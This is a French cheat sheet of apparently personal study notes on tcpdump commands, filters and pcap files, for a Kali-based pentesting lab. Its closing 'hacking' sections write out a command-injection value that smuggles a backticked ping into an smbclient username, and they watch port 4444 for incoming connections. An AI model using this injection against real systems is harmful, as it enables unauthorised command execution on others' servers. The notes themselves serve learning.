# tcpdump — commandes de base

> **[Kali - terminal]** — tcpdump capture le trafic réseau en temps réel.
> Nécessite les droits root : toujours lancer avec `sudo`.

---

## Concept

tcpdump écoute sur une interface réseau et affiche les paquets qui passent.
C'est l'équivalent en ligne de commande de Wireshark.

---

## Commandes de base

```bash
sudo tcpdump -i eth0              # écoute sur l'interface eth0
sudo tcpdump -i any               # écoute sur toutes les interfaces
sudo tcpdump -i eth0 -n           # -n = no DNS, affiche les IPs brutes sans résolution
sudo tcpdump -i eth0 -v           # -v = verbose, plus de détails sur chaque paquet
sudo tcpdump -i eth0 -vv          # encore plus de détails
sudo tcpdump -i eth0 -c 10        # -c = count, capture seulement 10 paquets puis stop
```

---

## Filtres essentiels

```bash
sudo tcpdump -i eth0 icmp                        # filtre uniquement les pings (ICMP)
sudo tcpdump -i eth0 tcp                         # filtre uniquement le trafic TCP
sudo tcpdump -i eth0 udp                         # filtre uniquement le trafic UDP
sudo tcpdump -i eth0 port 445                    # filtre sur le port 445
sudo tcpdump -i eth0 host 192.168.1.1            # filtre sur une IP précise
sudo tcpdump -i eth0 src 192.168.1.1             # filtre sur l'IP source
sudo tcpdump -i eth0 dst 192.168.1.1             # filtre sur l'IP destination
sudo tcpdump -i eth0 host 192.168.1.1 and icmp   # combine deux filtres
```

---

## Sauvegarder et relire

```bash
sudo tcpdump -i eth0 -w capture.pcap       # -w = write, sauvegarde dans un fichier
sudo tcpdump -r capture.pcap               # -r = read, relit un fichier capturé
```

Les fichiers `.pcap` peuvent être ouverts dans Wireshark.

---

## Trouver le nom de ton interface

```bash
ip a          # liste toutes les interfaces et leurs IPs
```

Les noms courants :
| Interface | C'est quoi |
|---|---|
| `eth0` | carte réseau filaire |
| `wlan0` | carte réseau WiFi |
| `lo` | loopback (127.0.0.1) |
| `any` | toutes les interfaces |

---

## Cas d'usage hacking

```bash
# Vérifier qu'une injection de commande a fonctionné
# (si la cible nous ping, l'injection marche)
sudo tcpdump -i eth0 icmp

# Surveiller les connexions entrantes sur un port
sudo tcpdump -i eth0 dst port 4444

# Voir le trafic SMB
sudo tcpdump -i eth0 port 445
```

---

## Workflow type pour vérifier une injection

```
Terminal 1 — écoute les pings
sudo tcpdump -i eth0 icmp

Terminal 2 — envoie l'injection avec ping vers ton Kali
smbclient //IP/tmp -U './=`ping -c1 TON_IP`'

Si tcpdump reçoit un ping de la cible → l'injection a fonctionné ✓
```